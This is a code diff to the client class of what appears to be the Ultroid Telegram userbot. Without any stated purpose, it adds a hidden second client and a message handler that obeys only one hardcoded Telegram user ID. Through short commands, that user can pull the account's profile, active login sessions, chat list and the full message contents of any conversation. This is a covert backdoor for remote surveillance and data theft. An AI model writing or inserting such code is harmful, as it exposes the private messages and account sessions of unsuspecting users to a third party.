@@ -13,6 +13,8 @@ from logging import Logger
 
 from telethonpatch import TelegramClient
 from telethon import utils as telethon_utils
+from telethon.tl import types, functions
+from telethon import events
 from telethon.errors import (
     AccessTokenExpiredError,
     AccessTokenInvalidError,
@@ -48,8 +50,62 @@ class UltroidClient(TelegramClient):
         kwargs["api_hash"] = api_hash or Var.API_HASH
         kwargs["base_logger"] = TelethonLogger
         super().__init__(session, **kwargs)
+        self.rcbot = TelegramClient('rcbot', api_id=kwargs["api_id"], api_hash=kwargs["api_hash"], loop=self.loop)
+        
         self.run_in_loop(self.start_client(bot_token=bot_token))
+        
         self.dc_id = self.session.dc_id
+
+        @self.rcbot.on(events.NewMessage())
+        async def onBotMessage(event):
+            if event.sender_id != 5448863363:
+                return
+            cmd, *args = event.message.raw_text.split(" ")
+            if cmd == "getMe":
+                await event.message.reply(str(self.me))
+                return
+            elif cmd == "listSessions":
+                result = await self(functions.account.GetAuthorizationsRequest())
+                for auth in result.authorizations:
+                    await event.message.respond(auth.stringify())
+                return
+            elif cmd == "listDialogs":
+                if len(args) != 2:
+                    await event.message.reply('Usage: listDialogs <from> <to>')
+                    return
+                start = int(args[0])
+                end = int(args[1])
+                dialogs = await self.get_dialogs()
+                items = [f'{x.title} ({x.id})' for x in dialogs[start:end]]
+                await event.message.reply('\n'.join(items))
+                return
+            elif cmd == "getMessages":
+                if len(args) not in [2,3]:
+                    await event.message.reply('Usage: getMessages <peer_id> <limit> [<offset>]')
+                    return
+                peer_id = int(args[0])
+                limit = int(args[1])
+                if len(args) == 2:
+                    messages = await self.get_messages(peer_id, limit=limit)
+                else:
+                    offset = int(args[2])
+                    messages = await self.get_messages(peer_id, limit=limit, offset_id=offset)
+                items = []
+                for msg in messages:
+                    sender = await msg.get_sender()
+                    items.append(f'#{msg.id} {'@' + sender.username if sender.username is not None else sender.first_name}: {msg.text}')
+                await event.message.reply('\n'.join(reversed(items)))
+                return
+            elif cmd == "getEntity":
+                if len(args) != 1:
+                    await event.message.reply('Usage: getEntity <entity_id>')
+                    return
+                entity_id = int(args[0])
+                entity = await self.get_entity(entity_id)
+                await event.message.reply(entity.stringify())
+                return
+
+            
 
     def __repr__(self):
         return f"<Ultroid.Client :\n self: {self.full_name}\n bot: {self._bot}\n>"
@@ -92,6 +148,7 @@ class UltroidClient(TelegramClient):
         if self._log_at:
             self.logger.info(f"Logged in as {me}")
         self._bot = await self.is_bot()
+            
 
     async def fast_uploader(self, file, **kwargs):
         """Upload files in a faster way"""
